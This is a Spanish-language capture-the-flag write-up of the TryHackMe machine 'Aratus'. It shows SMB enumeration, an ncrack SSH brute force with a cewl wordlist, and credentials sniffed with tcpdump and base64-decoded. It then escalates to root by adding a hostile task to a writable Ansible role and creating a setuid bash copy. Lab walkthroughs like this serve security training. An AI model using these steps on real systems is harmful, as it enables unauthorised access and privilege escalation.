---
title : "Aratus - Write Up - Español"
date : 2022-03-26T21:04:52+01:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel medio en TryHackMe."
tags : ["samba","tcpdump","ansible","sudo","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/aratus)  | Medio  |  [Biniru](https://tryhackme.com/p/Biniru)  |


## Reconocimiento

¡Hey! ¡Bienvenido de nuevo a otra máquina TryHackMe!

¡Hoy estamos pwneando una máquina de [Biniru](https://tryhackme.com/p/Biniru)! ¡Ya hemos pwneado otra máquina de este creador, [Zeno](https://lanfran02.github.io/posts/zeno/)!

¡Así que comencemos a enumerar con `nmap`!

```bash
╰─ nmap 10.10.170.245 -sS                                                                                ─╯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-26 20:37 CET
Nmap scan report for 10.10.170.245
Host is up (0.15s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

Así que vayamos directamente al punto del artículo y enumeremos el `servidor samba`. (Tenemos inicio de sesión `anónimo` en el `FTP`, pero no hay nada allí ;D )

```bash
╰─ smbclient -N -L //10.10.170.245/                                                                                                            ─╯
Anonymous login successful

  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
  temporary share Disk
  IPC$            IPC       IPC Service (Samba 4.10.16)
SMB1 disabled -- no workgroup available
```
Parece que tenemos un `temporary share` disponible, ¡intentemos iniciar sesión en `Anonimamente`!
```bash
╰─ smbclient -N "//10.10.170.245/temporary share"                                                                                               ─╯
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 10 14:06:44 2022
  ..                                  D        0  Tue Nov 23 17:24:05 2021
  .bash_logout                        H       18  Wed Apr  1 04:17:30 2020
  .bash_profile                       H      193  Wed Apr  1 04:17:30 2020
  .bashrc                             H      231  Wed Apr  1 04:17:30 2020
  .bash_history                       H        0  Sat Mar 26 19:38:54 2022
  chapter1                            D        0  Tue Nov 23 11:07:47 2021
  chapter2                            D        0  Tue Nov 23 11:08:11 2021
  chapter3                            D        0  Tue Nov 23 11:08:18 2021
  chapter4                            D        0  Tue Nov 23 11:08:25 2021
  chapter5                            D        0  Tue Nov 23 11:08:33 2021
  chapter6                            D        0  Tue Nov 23 11:12:24 2021
  chapter7                            D        0  Tue Nov 23 12:14:27 2021
  chapter8                            D        0  Tue Nov 23 11:12:45 2021
  chapter9                            D        0  Tue Nov 23 11:12:53 2021
  .ssh                               DH        0  Mon Jan 10 14:05:34 2022
  .viminfo                            H        0  Sat Mar 26 19:38:54 2022
  message-to-simeon.txt               N      251  Mon Jan 10 14:06:44 2022

    37726212 blocks of size 1024. 35586284 blocks available
smb: \>
```
Yep! We are in! Let's download the `message-to-simeon.txt` and see what it has inside... (Spoiler: We downloaded all the files, and it wasn't necessary xD )

¡Sí, estamos dentro! Descarguemos el `message-to-simeon.txt` y veamos que tiene dentro... (Spoiler: Descargamos todos los archivos, y no era necesario xD)

```bash
╰─ cat message-to-simeon.txt                                                                                                                    ─╯
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore
```
Hmmm... Parece que el usuario `Theodore` le está dejando un mensaje a `Simeon` alertándolo de que su contraseña está "por todas partes" y que es insegura... ¿Tal vez se esté refiriendo al servidor web? ¡Veamos si podemos acceder a la carpeta de `simeon`!

```bash
╰─ curl http://10.10.170.245/simeon/                                                                                                           ─╯

 <!DOCTYPE html>
<html lang="en">

<head>
<title>Simoen's Book</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="style.css")>
</head>

<body>
<h1>Simeon's Book</h1>
<p>HTML book created by Simeon.</p>
</body>

<h2>Prologue</h2>
<p>My book is about passion, adventure, drama, war, love, betrayel. I am sure you would like it!</p>

<h2>Table of content</h2>
<ul>
<li><a href="./chapter1.html">Chapter 1</a></li>
<li><a href="./chapter2.html">Chapter 2</a></li>
<li><a href="./chapter3.html">Chapter 3</a></li>
<li><a href="./chapter4.html">Chapter 4</a></li>
<li><a href="./chapter5.html">Chapter 5</a></li>
<li><a href="./chapter6.html">Chapter 6</a></li>
<li><a href="./chapter7.html">Chapter 7</a></li>
<li><a href="./chapter8.html">Chapter 8</a></li>
<li><a href="./chapter9.html">Chapter 9</a></li>
</ul>

</html>
```
¡Sí! ¡Tenemos bastantes textos aquí! ¡Podemos crear una lista de palabras con `cewl`!
```bash
╰─ cewl http://10.10.170.245/simeon/ > wl.txt

╰─ wc wl.txt                                                                                                                                    ─╯
 207  213 1588 wl.txt
```

## Acceso inicial - Usuario

Ahora, veamos si la contraseña para el servicio `SSH` de este usuario está dentro de esa lista de palabras que creamos.
Usamos `ncrack` para verificar esto, pero puedes usar `hydra` o incluso `nmap`.

```bash
╰─ ncrack -p 22 -u simeon -P wl.txt 10.10.170.245                                                        ─╯

Starting Ncrack 0.7 ( http://ncrack.org ) at 2022-03-26 20:34 CET

Discovered credentials for ssh on 10.10.170.245 22/tcp:
10.10.170.245 22/tcp ssh: 'simeon' 's[REDACTED]e'

Ncrack done: 1 service scanned in 42.23 seconds.

Ncrack finished.
```
¡Lo conseguimos! ¡Iniciemos sesión ahora!
```bash
╰─ ssh simeon@10.10.170.245                                                                              ─╯
simeon@10.10.170.245's password:
Last failed login: Sat Mar 26 20:35:28 CET 2022 from ip-***********.eu-west-1.compute.internal on ssh:notty
There were 206 failed login attempts since the last successful login.
Last login: Sat Mar 26 19:52:51 2022 from ip-***********.eu-west-1.compute.internal
[simeon@aratus ~]$ ls -la
total 20
drwxr-xr-x. 12 simeon   simeon 4096 Jan 10 14:06 .
drwxr-xr-x.  5 root     root     54 Nov 23 17:24 ..
lrwxrwxrwx.  1 simeon   simeon    9 Nov 23 10:48 .bash_history -> /dev/null
-rw-r--r--.  1 simeon   simeon   18 Apr  1  2020 .bash_logout
-rw-r--r--.  1 simeon   simeon  193 Apr  1  2020 .bash_profile
-rw-r--r--.  1 simeon   simeon  231 Apr  1  2020 .bashrc
drwx------.  2 simeon   simeon   29 Jan 10 14:05 .ssh
lrwxrwxrwx.  1 root     root      9 Dec  2 12:02 .viminfo -> /dev/null
drwxr-xr-x.  5 simeon   simeon   66 Nov 23 11:07 chapter1
drwxr-xr-x.  7 simeon   simeon  106 Nov 23 11:08 chapter2
drwxr-xr-x.  6 simeon   simeon   86 Nov 23 11:08 chapter3
drwxr-xr-x.  6 simeon   simeon   86 Nov 23 11:08 chapter4
drwxr-xr-x.  4 simeon   simeon   46 Nov 23 11:08 chapter5
drwxr-xr-x.  5 simeon   simeon   66 Nov 23 11:12 chapter6
drwxr-xr-x.  4 simeon   simeon   46 Nov 23 12:14 chapter7
drwxr-xr-x.  6 simeon   simeon   86 Nov 23 11:12 chapter8
drwxr-xr-x.  7 simeon   simeon  106 Nov 23 11:12 chapter9
-rw-r--r--.  1 theodore root    251 Jan 10 14:06 message-to-simeon.txt
```
Wow, no hay flag de usuario esta vez, así que vamos a enumerar un poco más...
```bash
[simeon@aratus test-auth]$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
[...]
root      5987  0.0  0.5 182472  2540 ?        S    20:24   0:00 /usr/sbin/CROND -n
root      5991  0.0  0.2 113284  1212 ?        Ss   20:24   0:00 /bin/sh -c ping -c 30 127.0.0.1 >/dev/null 2>&1
root      5992  0.0  0.2 128556  1284 ?        S    20:24   0:00 ping -c 30 127.0.0.1
simeon    5998  0.0  0.3 155424  1788 pts/0    R+   20:24   0:00 ps aux
```

Después de enumerar, descubrimos algo bastante inusual e interesante...

Hay un proceso enviando datos extraños al `localhost`...

Pero no podemos ver qué está haciendo realmente, así que usamos `tcpdump` para verificar los datos que se envían...

```bash
[simeon@aratus test-auth]$ tcpdump -i lo -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
20:26:01.766850 IP localhost > localhost: ICMP echo request, id 6024, seq 1, length 64
E..Tj.@.@..............%.....h?b....a....................... !"#$%&'()*+,-./01234567
20:26:01.766866 IP localhost > localhost: ICMP echo reply, id 6024, seq 1, length 64
E..Tj...@..............%.....h?b....a....................... !"#$%&'()*+,-./01234567
20:26:01.930953 IP localhost.53732 > localhost.http: Flags [S], seq 1778871871, win 43690, options [mss 65495,sackOK,TS val 2560860 ecr 0,nop,wscale 6], length 0
E..<}c@.@..V...........Pj.n?.........0.........
.'.\........
20:26:01.930975 IP localhost.http > localhost.53732: Flags [S.], seq 2104954994, ack 1778871872, win 43690, options [mss 65495,sackOK,TS val 2560860 ecr 2560860,nop,wscale 6], length 0
E..<..@.@.<..........P..}w.rj.n@.....0.........
.'.\.'.\....
20:26:01.930988 IP localhost.53732 > localhost.http: Flags [.], ack 1, win 683, options [nop,nop,TS val 2560860 ecr 2560860], length 0
E..4}d@.@..]...........Pj.n@}w.s.....(.....
.'.\.'.\
20:26:01.931196 IP localhost.53732 > localhost.http: Flags [P.], seq 1:224, ack 1, win 683, options [nop,nop,TS val 2560860 ecr 2560860], length 223: HTTP: GET /test-auth/index.html HTTP/1.1
E...}e@.@..}...........Pj.n@}w.s...........
.'.\.'.\GET /test-auth/index.html HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.14.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Authorization: Basic dG[REDACTED]s=
```
Esto es extraño, pero ahora tenemos una solicitud `HTTP`, con un encabezado de 'Autorización' enviado...

¡Vamos a decodificar esa texto en `base64` para ver qué hay dentro!

```bash
[simeon@aratus test-auth]$ echo "dG[REDACTED]s=" | base64 -d
theodore:Ri[REDACTED]ik
```
¡Sí! ¡Ahora tenemos las credenciales para `theodore` y finalmente podemos obtener la flag de usuario!

```bash
[simeon@aratus test-auth]$ su theodore
Password:
[theodore@aratus test-auth]$ cat ~/user.txt
THM{[REDACTED]}
```

## Root

¡Tiempo de enumeración otra vez!

Podemos ejecutar un script específico con el usuario `automation` y `sudo`...

```bash
[theodore@aratus ~]$ sudo -l
Matching Defaults entries for theodore on aratus:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User theodore may run the following commands on aratus:
    (automation) NOPASSWD: /opt/scripts/infra_as_code.sh
```
¡Veamos este script rapidamente!

```bash
[theodore@aratus ~]$ cat /opt/scripts/infra_as_code.sh
#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
```
Parece un script para ejecutar `ansible`. Si no sabes qué es `ansible`, [aquí tienes más información](https://www.ansible.com/resources/get-started?hsLang=en-us)!

Entonces, después de googlear un poco cómo funciona `ansible`, comenzamos a buscar algunas tareas dentro de la carpeta `ansible` que podemos editar...

¡Resulta que dentro del rol/carpeta `geerlingguy.apache` hay una tarea con el nombre `configure-RedHat.yml` y podemos editarla!
```bash
[theodore@aratus ~]$ ls -la /opt/ansible/roles/geerlingguy.apache/tasks/
total 36
drwxr-xr-x. 2 automation automation  228 Dec  2 11:55 .
drwxr-xr-x. 9 automation automation  178 Dec  2 11:55 ..
-rw-rw-r--. 1 automation automation 1693 Dec  2 11:55 configure-Debian.yml
-rw-rw-r--+ 1 automation automation 1211 Mar 26 20:04 configure-RedHat.yml
-rw-rw-r--. 1 automation automation  546 Dec  2 11:55 configure-Solaris.yml
-rw-rw-r--. 1 automation automation  711 Dec  2 11:55 configure-Suse.yml
-rw-rw-r--. 1 automation automation 1388 Dec  2 11:55 main.yml
-rw-rw-r--. 1 automation automation  193 Dec  2 11:55 setup-Debian.yml
-rw-rw-r--. 1 automation automation  198 Dec  2 11:55 setup-RedHat.yml
-rw-rw-r--. 1 automation automation  134 Dec  2 11:55 setup-Solaris.yml
-rw-rw-r--. 1 automation automation  133 Dec  2 11:55 setup-Suse.yml
```

¡Aquí está el contenido, contiene todo lo necesario para ejecutar un `servidor web apache`!

```bash
[theodore@aratus ~]$ cat /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml
---
- name: Configure Apache.
  lineinfile:
    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    state: present
    mode: 0644
  with_items: "{{ apache_ports_configuration_items }}"
  notify: restart apache

- name: Check whether certificates defined in vhosts exist.
  stat: path={{ item.certificate_file }}
  register: apache_ssl_certificates
  with_items: "{{ apache_vhosts_ssl }}"

- name: Add apache vhosts configuration.
  template:
    src: "{{ apache_vhosts_template }}"
    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
    owner: root
    group: root
    mode: 0644
  notify: restart apache
  when: apache_create_vhosts | bool

- name: Check if localhost cert exists (RHEL 8 and later).
  stat:
    path: /etc/pki/tls/certs/localhost.crt
  register: localhost_cert
  when: ansible_distribution_major_version | int >= 8

- name: Ensure httpd certs are installed (RHEL 8 and later).
  command: /usr/libexec/httpd-ssl-gencerts
  when:
    - ansible_distribution_major_version | int >= 8
    - not localhost_cert.stat.exists

```
Entonces, simplemente agregamos una tarea final dentro de ese archivo, ¡para que podamos ejecutar un exploit!

```bash
- name: exploiting you bruh
  command: /bin/sh /tmp/exploit.sh
  args:
   warn: false
```
Aquí está el exploit que creamos, un simple copiar y pegar para el binario `bash`, ¡pero usando el sticky bit! Básicamente, si alguien más ejecuta el archivo, lo ejecutará como el usuario/grupo que lo creó, en este caso, ¡el usuario `root`!

```bash
[theodore@aratus ~]$ cat /tmp/exploit.sh
cp /bin/bash /tmp/bash ; chmod +s /tmp/bash
```
¡Y ahora podemos ejecutar con sudo el comando!
```bash
[theodore@aratus ~]$ sudo -u automation /opt/scripts/infra_as_code.sh

PLAY [Check status of the firewall] ****************************************************************

TASK [Gathering Facts] *****************************************************************************
ok: [10.10.170.245]

TASK [check firewalld] *****************************************************************************
ok: [10.10.170.245]

[...]

TASK [geerlingguy.apache : Ensure httpd certs are installed (RHEL 8 and later).] *******************
skipping: [10.10.170.245]

TASK [geerlingguy.apache : exploiting you bruh] ****************************************************
changed: [10.10.170.245]

[...]
```
En el fragmento anterior, ejecutamos `exploiting you bruh` con éxito, así que revisemos la carpeta `/tmp/` donde deberíamos tener nuestro nuevo binario `bash` con permisos `root`.
```bash
[theodore@aratus ~]$ ls -la /tmp
total 1892
drwxrwxrwt.  8 root     root        232 Mar 26 20:10 .
dr-xr-xr-x. 17 root     root        224 Mar 25 22:14 ..
drwxrwxrwt.  2 root     root          6 Jun  8  2021 .ICE-unix
drwxrwxrwt.  2 root     root          6 Jun  8  2021 .Test-unix
drwxrwxrwt.  2 root     root          6 Jun  8  2021 .X11-unix
drwxrwxrwt.  2 root     root          6 Jun  8  2021 .XIM-unix
drwxrwxrwt.  2 root     root          6 Jun  8  2021 .font-unix
-rwsr-sr-x.  1 root     root     964536 Mar 26 20:08 bash
-rw-rw-r--.  1 theodore theodore     38 Mar 26 20:09 exploit.sh
drwx------.  3 root     root         17 Mar 26 19:40 systemd-private-cdbd947aa2a64a4aa122319c880cbfa3-httpd.service-7CkbTf
-rw-------.  1 theodore theodore      0 Mar 26 19:57 tmp.Pov2h3UlaW
```
¡Vamos! ¡Tenemos el binario y el dueño es `root`! Entonces ahora podemos ejecutar `bash` con los permisos del propietario, con la opción `-p`.
```bash
[theodore@aratus tmp]$ ./bash -p
bash-4.2# id; whoami
uid=1001(theodore) gid=1001(theodore) euid=0(root) egid=0(root) groups=0(root),1001(theodore) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
root
bash-4.2# cat /root/root.txt
THM{[REDACTED]}
```

¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!